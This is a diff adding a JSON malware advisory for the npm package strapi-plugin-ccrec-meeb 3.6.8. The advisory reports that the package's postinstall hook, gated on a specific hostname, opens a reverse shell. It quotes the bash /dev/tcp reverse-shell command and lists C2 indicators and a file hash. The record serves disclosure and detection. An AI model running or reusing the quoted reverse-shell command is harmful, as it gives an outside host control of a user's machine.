@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12162",
+  "modified": "2026-09-16T07:18:05Z",
+  "published": "2026-09-16T07:17:47Z",
+  "summary": "Malicious code in strapi-plugin-ccrec-meeb (npm)",
+  "details": "The package's postinstall hook runs postinstall.js, which opens a reverse shell. It first checks the machine hostname and exits silently unless it matches 'ubuntu-fc-uvm' (an anti-analysis gate). When the check passes, it executes `bash -i \u003e\u0026 /dev/tcp/14[.]225[.]210[.]85/80 0\u003e\u00261`, giving the remote host an interactive shell on the installer's machine, retrying up to 5 times every 10 seconds and logging activity to /tmp/postinstall-revshell.log. C2: 14[.]225[.]210[.]85:80.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "strapi-plugin-ccrec-meeb",
+        "purl": "pkg:npm/strapi-plugin-ccrec-meeb"
+      },
+      "versions": [
+        "3.6.8"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/strapi-plugin-ccrec-meeb/v/3.6.8"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12162"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-16T07:17:47Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "14[.]225[.]210[.]85",
+          "14[.]225[.]210[.]85:80"
+        ],
+        "sha256": [
+          "8b3587fec80fcfa8ebae7964f612ba22345c02b9fdfc649f5f71149062d352c0"
+        ]
+      }
+    }
+  }
+}
